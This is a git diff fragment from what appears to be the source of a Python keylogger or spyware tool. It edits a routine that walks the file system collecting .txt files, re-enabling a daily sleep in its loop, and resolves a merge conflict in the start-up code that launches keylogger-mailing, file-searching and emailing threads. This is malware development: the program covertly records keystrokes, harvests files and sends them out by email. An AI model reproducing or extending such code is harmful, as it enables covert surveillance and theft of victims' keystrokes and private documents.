@@ -220,10 +220,10 @@ class OSmanipulation(object):
 
     def Copy_interesting_files(self):
         while self.continue_checking_flag is True:
-            #time.sleep(86400)
+            time.sleep(86400)
             try:
                 for root, dirs, files in os.walk(Constants.SEARCH_ROOT):
-                    print(1)
+                    
                     for each in files:
                         if each.endswith('txt'):
                             temp=str(each)
@@ -460,25 +460,12 @@ def kickOff():
     stop_timer.start()
     keylogger_mail_thread.start()
     stop_keylogger_mail_thread.start()
-
-<<<<<<< HEAD
-
-
-
-    #Start the threads for emailing
-    # Start the threads for file copy
+  #Start the threads for file copy
     searching_thread.start()
     stop_searching_thread.start()
 
     # Start the threads for emailing
 
-=======
-    #Start the threads for file copy
-    searching_thread.start()
-    stop_searching_thread.start()
-
-    # Start the threads for emailing
->>>>>>> origin/master
     email_thread.start()
     
 
